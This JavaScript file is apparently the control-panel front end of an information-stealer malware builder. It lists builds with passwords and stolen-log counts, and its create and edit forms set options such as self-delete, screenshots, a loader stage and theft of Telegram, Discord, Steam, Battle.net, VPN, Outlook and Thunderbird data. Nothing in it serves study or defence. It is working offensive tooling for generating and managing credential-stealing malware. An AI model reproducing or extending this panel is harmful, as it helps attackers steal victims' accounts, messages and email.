var create_build_modal = new bootstrap.Modal(document.getElementById('create_build_modal'), 
{
    backdrop: 'static',
    keyboard: false
});

var edit_build_modal = new bootstrap.Modal(document.getElementById('edit_build_modal'), 
{
    backdrop: 'static',
    keyboard: false
});

var modal_rebuild_all = new bootstrap.Modal(document.getElementById('modal_rebuild_all'), 
{
    backdrop: 'static',
    keyboard: false
});

var modal_create_button     = document.querySelector('#modal_create_button');
var modal_edit_button       = document.querySelector('#modal_edit_button');

/**
 * utf8_to_b64
 *
 * Convert text to base64 uri
 *
 * @return none
 */
function utf8_to_b64(str) 
{
	return window.btoa(unescape(encodeURIComponent(str)));
}

var table;

$(document).ready(function()
{
    table = $('#builds_table').DataTable(
    {
        dom: '<"top"i>rt<"bottom"lp><"clear">', 
        paging: true,
        pagingType: "full_numbers",
        processing: true,
        serverSide: true,
        ordering: false,
        searching: false,
        pageLength: 25,
        lengthMenu: [ [10, 25, 50, 100, 200], [10, 25, 50, 100, 200] ],
        autoWidth: false,
    
        ajax:
        {
            url: 'api/builder', 
            type: 'POST',

            data: function (d) 
            {
                d.method                    = "get_builds_list";
                delete d.columns;
                delete d.search;
            }
        },
    
        columns: 
        [
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.build_id}`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `<h6 class="fw-semibold mb-0">${data.name}</h6>`
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.version}`
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `
                    <div class="form-group">
                        <input type="text" class="form-control" id="readonly" value="${data.password}" readonly="" onclick="this.select()">
                    </div>`
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    const updated_date = formatTimeAgo(new Date(data.last_compile));
                    return `<b>${data.last_compile}</b><br> <i>${updated_date}</i>`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.logs_count}`
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    switch(data.active)
                    {
                        case "0":
                            return `<span class="mb-1 badge text-bg-danger">Disabled</span>`;
                            break;

                        case "1":
                            return `<span class="mb-1 badge text-bg-primary">Active</span>`;
                            break;
                    }
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `
                    <div class="btn-group" style="margin-bottom: 6px;">
                        <button type="button" class="btn btn-primary" onclick="window.open('builds/${data.name}.zip', '_blank');">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
                                <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 18a3.5 3.5 0 0 0 0-7h-1A5 4.5 0 0 0 7 9a4.6 4.4 0 0 0-2.1 8.4M12 13v9m-3-3l3 3l3-3"></path>
                            </svg> Download
                        </button>
                        <button type="button" class="btn bg-primary-subtle dropdown-toggle dropdown-toggle-split" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <span class="sr-only">Actions</span>
                        </button>
                        <ul class="dropdown-menu">
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="editBuildModal('${data.build_id}')">Edit</a>
                            </li>
                            
                            <li>
                                <hr class="dropdown-divider">
                            </li>
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="ChangeStatus('${data.build_id}', '${data.active == 1 ? '0' : '1'}')">${data.active == 1 ? 'Disable' : 'Enable'}</a>
                            </li>
                            <li>
                                <hr class="dropdown-divider">
                            </li>
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="DeleteBuild('${data.build_id}')">Delete</a>
                            </li>
                        </ul>
                    </div>
                    `;
                }
            }
        ]
    });
});

function formatTimeAgo(startDate) 
{
    const currentDate = new Date(server_time);
    const timeDifference = currentDate - startDate;

    if (timeDifference < 0) 
    {
        return "Date is in the future";
    }

    const seconds = Math.floor(timeDifference / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    const days = Math.floor(hours / 24);
    const months = Math.floor(days / 30);

    let result = [];

    if (months > 0) {
        result.push(`${months}m`);
    }

    const remainingDays = days % 30;
    if (remainingDays > 0) {
        result.push(`${remainingDays}d`);
    }

    const remainingHours = hours % 24;
    if (remainingHours > 0) {
        result.push(`${remainingHours}h`);
    }

    const remainingMinutes = minutes % 60;
    if (remainingMinutes > 0) {
        result.push(`${remainingMinutes}m`);
    }

    const remainingSeconds = seconds % 60;
    if (remainingSeconds > 0) {
        result.push(`${remainingSeconds}s`);
    }

    if (result.length === 0) {
        return "just now";
    }

    return result.join(" ") + " ago";
}

function ChangeStatus(build_id, build_status)
{
    $.post('api/builder', 
    { 
        method: 'change_status',
        build_id: build_id,
        build_status: build_status
    },
    function(response) 
    {
        if (response.success)
        {
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

function createBuildModal()
{
    $('#create_build_name').val("");

    $('#create_self_delete').prop('checked', false);
    $('#create_take_screenshot').prop('checked', true);
    $('#create_block_hwid').prop('checked', false);
    $('#create_block_ips').prop('checked', false);

    $('#create_loader_before_grabber').prop('checked', false);

    $('#create_steal_telegram').prop('checked', true);
    $('#create_steal_discord').prop('checked', true);
    $('#create_steal_tox').prop('checked', true);
    $('#create_steal_pidgin').prop('checked', true);

    $('#create_steal_steam').prop('checked', true);
    $('#create_steal_battlenet').prop('checked', true);
    $('#create_steal_uplay').prop('checked', true);

    $('#create_steal_protonvpn').prop('checked', true);
    $('#create_steal_openvpn').prop('checked', true);

    $('#create_steal_outlook').prop('checked', true);
    $('#create_steal_thunderbird').prop('checked', true);

    create_build_modal.show();
    modal_create_button.addEventListener('click', handleCreateBuild);
}

function handleCreateBuild()
{
    var name                = $('#create_build_name').val();
    var self_delete         = $('#create_self_delete').is(':checked') ? 1 : 0;
    var take_screenshot     = $('#create_take_screenshot').is(':checked') ? 1 : 0;
    var block_hwid          = $('#create_block_hwid').is(':checked') ? 1 : 0;
    var block_ips           = $('#create_block_ips').is(':checked') ? 1 : 0;

    var loader_before       = $('#create_loader_before_grabber').is(':checked') ? 1 : 0;

    var steal_telegram      = $('#create_steal_telegram').is(':checked') ? 1 : 0;
    var steal_discord       = $('#create_steal_discord').is(':checked') ? 1 : 0;
    var steal_tox           = $('#create_steal_tox').is(':checked') ? 1 : 0;
    var steal_pidgin        = $('#create_steal_pidgin').is(':checked') ? 1 : 0;

    var steal_steam         = $('#create_steal_steam').is(':checked') ? 1 : 0;
    var steal_battlenet     = $('#create_steal_battlenet').is(':checked') ? 1 : 0;
    var steal_uplay         = $('#create_steal_uplay').is(':checked') ? 1 : 0;

    var steal_protonvpn     = $('#create_steal_protonvpn').is(':checked') ? 1 : 0;
    var steal_openvpn       = $('#create_steal_openvpn').is(':checked') ? 1 : 0;

    var steal_outlook       = $('#create_steal_outlook').is(':checked') ? 1 : 0;
    var steal_thunderbird   = $('#create_steal_thunderbird').is(':checked') ? 1 : 0;

    if (name.trim().length > 0)
    {
        $.post('api/builder',
        {
            method: "create_build",
            name: name,
            self_delete: self_delete,
            take_screenshot: take_screenshot,
            block_hwid: block_hwid,
            block_ips: block_ips,

            loader_before: loader_before,

            steal_telegram: steal_telegram,
            steal_discord: steal_discord,
            steal_tox: steal_tox,
            steal_pidgin: steal_pidgin,

            steal_steam: steal_steam,
            steal_battlenet: steal_battlenet,
            steal_uplay: steal_uplay,
            
            steal_protonvpn: steal_protonvpn,
            steal_openvpn: steal_openvpn,

            steal_outlook: steal_outlook,
            steal_thunderbird: steal_thunderbird
        },
        function(response) 
        {
            if (response.success)
            {
                table.draw();
                create_build_modal.hide();
    
                toastr.info(response.success);
                modal_create_button.removeEventListener('click', handleCreateBuild);
            }
            else
            {
                toastr.warning(response.error);
            }
        }, 'json'); 
    }
    else
    {


        toastr.error("Error: Enter Build Name");
    }
}

function editBuildModal(build_id)
{
    $('#edit_build_name').val("");

    $('#edit_self_delete').prop('checked', false);
    $('#edit_take_screenshot').prop('checked', false);
    $('#edit_block_hwid').prop('checked', false);
    $('#edit_block_ips').prop('checked', false);

    $('#edit_loader_before_grabber').prop('checked', false);

    $('#edit_steal_telegram').prop('checked', false);
    $('#edit_steal_discord').prop('checked', false);
    $('#edit_steal_tox').prop('checked', false);
    $('#edit_steal_pidgin').prop('checked', false);

    $('#edit_steal_steam').prop('checked', false);
    $('#edit_steal_battlenet').prop('checked', false);
    $('#edit_steal_uplay').prop('checked', false);

    $('#edit_steal_protonvpn').prop('checked', false);
    $('#edit_steal_openvpn').prop('checked', false);

    $('#edit_steal_outlook').prop('checked', false);
    $('#edit_steal_thunderbird').prop('checked', false);

    $.post('api/builder',
    {
        method: "get_build",
        build_id: build_id
    },
    function(response) 
    {
        if (response.success)
        {
            $('#modal_edit_build_header').text(`Edit Build "${response.data.name}"`);

            $('#edit_build_id').val(build_id);
            $('#edit_build_name').val(response.data.name);

            $('#edit_self_delete').prop('checked', !!+response.data.self_delete);
            $('#edit_take_screenshot').prop('checked', !!+response.data.take_screenshot);
            $('#edit_block_hwid').prop('checked', !!+response.data.block_hwid);
            $('#edit_block_ips').prop('checked', !!+response.data.block_ips);

            $('#edit_loader_before_grabber').prop('checked', !!+response.data.loader_before_grabber);

            $('#edit_steal_telegram').prop('checked', !!+response.data.steal_telegram);
            $('#edit_steal_discord').prop('checked', !!+response.data.steal_discord);
            $('#edit_steal_tox').prop('checked', !!+response.data.steal_tox);
            $('#edit_steal_pidgin').prop('checked', !!+response.data.steal_pidgin);

            $('#edit_steal_steam').prop('checked', !!+response.data.steal_steam);
            $('#edit_steal_battlenet').prop('checked', !!+response.data.steal_battlenet);
            $('#edit_steal_uplay').prop('checked', !!+response.data.steal_uplay);

            $('#edit_steal_protonvpn').prop('checked', !!+response.data.steal_protonvpn);
            $('#edit_steal_openvpn').prop('checked', !!+response.data.steal_openvpn);

            $('#edit_steal_outlook').prop('checked', !!+response.data.steal_outlook);
            $('#edit_steal_thunderbird').prop('checked', !!+response.data.steal_thunderbird);


            edit_build_modal.show();
            modal_edit_button.addEventListener('click', handleEditBuild);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json'); 
}

function handleEditBuild()
{
    var build_id            = $('#edit_build_id').val();
    var self_delete         = $('#edit_self_delete').is(':checked') ? 1 : 0;
    var take_screenshot     = $('#edit_take_screenshot').is(':checked') ? 1 : 0;
    var block_hwid          = $('#edit_block_hwid').is(':checked') ? 1 : 0;
    var block_ips           = $('#edit_block_ips').is(':checked') ? 1 : 0;

    var loader_before       = $('#edit_loader_before_grabber').is(':checked') ? 1 : 0;

    var steal_telegram      = $('#edit_steal_telegram').is(':checked') ? 1 : 0;
    var steal_discord       = $('#edit_steal_discord').is(':checked') ? 1 : 0;
    var steal_tox           = $('#edit_steal_tox').is(':checked') ? 1 : 0;
    var steal_pidgin        = $('#edit_steal_pidgin').is(':checked') ? 1 : 0;

    var steal_steam         = $('#edit_steal_steam').is(':checked') ? 1 : 0;
    var steal_battlenet     = $('#edit_steal_battlenet').is(':checked') ? 1 : 0;
    var steal_uplay         = $('#edit_steal_uplay').is(':checked') ? 1 : 0;

    var steal_protonvpn     = $('#edit_steal_protonvpn').is(':checked') ? 1 : 0;
    var steal_openvpn       = $('#edit_steal_openvpn').is(':checked') ? 1 : 0;

    var steal_outlook       = $('#edit_steal_outlook').is(':checked') ? 1 : 0;
    var steal_thunderbird   = $('#edit_steal_thunderbird').is(':checked') ? 1 : 0;

    $.post('api/builder',
    {
        method: "edit_build",
        build_id: build_id,
        self_delete: self_delete,
        take_screenshot: take_screenshot,
        block_hwid: block_hwid,
        block_ips: block_ips,

        loader_before: loader_before,

        steal_telegram: steal_telegram,
        steal_discord: steal_discord,
        steal_tox: steal_tox,
        steal_pidgin: steal_pidgin,

        steal_steam: steal_steam,
        steal_battlenet: steal_battlenet,
        steal_uplay: steal_uplay,
            
        steal_protonvpn: steal_protonvpn,
        steal_openvpn: steal_openvpn,

        steal_outlook: steal_outlook,
        steal_thunderbird: steal_thunderbird
    },
    function(response) 
    {
        if (response.success)
        {
            edit_build_modal.hide();
    
            toastr.info(response.success);
            modal_edit_button.removeEventListener('click', handleEditBuild);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json'); 
}

function DeleteBuild(build_id)
{
    $.post('api/builder', 
    { 
        method: 'delete_build',
        build_id: build_id
    },
    function(response) 
    {
        if (response.success)
        {
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

function RebuildAll()
{
    modal_rebuild_all.show();
}

function RebuildAllProcess()
{
    $.post('api/builder', 
    { 
        method: 'rebuild_all'
    },
    function(response) 
    {
        if (response.success)
        {
            modal_rebuild_all.hide();
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}